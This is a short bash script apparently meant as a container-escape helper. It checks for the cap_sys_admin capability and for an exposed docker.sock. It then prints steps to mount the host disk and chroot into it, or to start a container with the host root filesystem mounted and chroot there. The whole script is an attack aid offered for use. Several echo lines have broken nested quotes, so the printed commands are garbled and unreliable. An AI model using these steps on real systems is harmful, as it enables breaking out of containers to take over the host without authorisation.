#!/bin/bash

capsh=$(which capsh)

ISADMIN=$($capsh --print | grep "cap_sys_admin")

if [ ! -z $ISADMIN ]
then
	echo "You are Admin"
	echo "Find disk in /dev"
	echo "Mount it " mount /dev/xxx /mnt""
	echo "chroot it " chroot /mnt bash""
	echo "Enjoy"
fi

HASSOCKET=$(find / -name docker.sock 2>/dev/null)

if [ ! -z $HASSOCKET ]
then
	echo "Found socket"
	echo "run "docker images" to find images to run"
	echo "run " docker run -it -v /:host <image> bash""
	echo "run "cd /host && chroot ./ bash""
	echo "Enjoy"
fi

